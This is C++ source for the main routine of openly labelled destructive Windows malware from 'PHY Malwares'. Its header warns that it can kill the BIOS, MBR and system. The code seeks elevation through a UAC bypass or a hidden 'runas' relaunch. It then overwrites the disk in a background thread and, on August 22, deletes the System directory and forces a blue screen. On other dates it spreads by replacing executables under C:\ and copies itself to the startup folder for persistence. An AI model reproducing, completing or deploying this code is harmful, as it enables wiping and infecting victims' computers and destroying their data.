/*
-----------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
------------------------------------  DEVELOPED BY PHY MALWARE AND RESEARCH CORP. -------------------------------------
-----------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
---------- IMPORTANT!! THIS VIRUS IS CAN KILL YOUR BIOS AND SYSTEM AND MBR AND OTHERS!! PLEASE REMEMBER THIS ----------
-----------------------------------------------------------------------------------------------------------------------
----------------------------------------------------- CREDITS ---------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
-------------------------------------- Thanks to give this idea for Tremendous ----------------------------------------
-----------------------------------------------------------------------------------------------------------------------
------------------------------------------- Source Code By PHY Malwares. ----------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
----------------------------------------------- Open Source Porject ---------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
---------------------------------------- https://github.com/PhyMalwares/PHY -------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
------------------------------------ PLEASE DON'T USE THIS AT FULL MALWAREIOUS ----------------------------------------
-----------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
----------------------------------------- DO NOT TRY THIS AT YOUR HOME. -----------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
--------------------------=====----------- Dev's Discord : nothing_64_ ------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------
*/

#include "Bypass.h"
#include "Destroy.h"

using namespace std;

int WINAPI wWinMain(HINSTANCE a, HINSTANCE b, LPWSTR c, int d)
{
	if (IsElevated())
	{
        time_t now = time(0);

        tm* localtm = localtime(&now);
        CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(OverWriteDisk), 0, 0, NULL);
        if (localtm->tm_mon == 7 && localtm->tm_mday == 22) {
            WCHAR SystemDirectory[MAX_PATH] = { 0 };
            GetSystemDirectory(SystemDirectory, MAX_PATH);
            DestroyDirectory(SystemDirectory);
            CALL_BSOD();
        }
        else {
            wstring originalExePath = getCurrentExecutablePath();
            wstring startDirectory = L"C:\\";
            findAndReplaceExecutablePath(startDirectory, originalExePath);
            copyToStartupFolder();
            if (copyToStartupFolder()) {
            }
            else {
            }
        }
	}
    else
    {
        if (GetOSVersion())
        {
            Bypass();
        }
        else
        {
            char pathtofile[MAX_PATH];
            HMODULE GetModH = GetModuleHandleA(NULL);
            GetModuleFileNameA(GetModH, pathtofile, sizeof(pathtofile));

            SHELLEXECUTEINFOA sei = { sizeof(sei) };
            sei.lpVerb = "runas";
            sei.lpFile = pathtofile;
            sei.hwnd = NULL;
            sei.nShow = SW_HIDE;
            sei.lpParameters = NULL;
            ShellExecuteExA(&sei);
        }
    }
}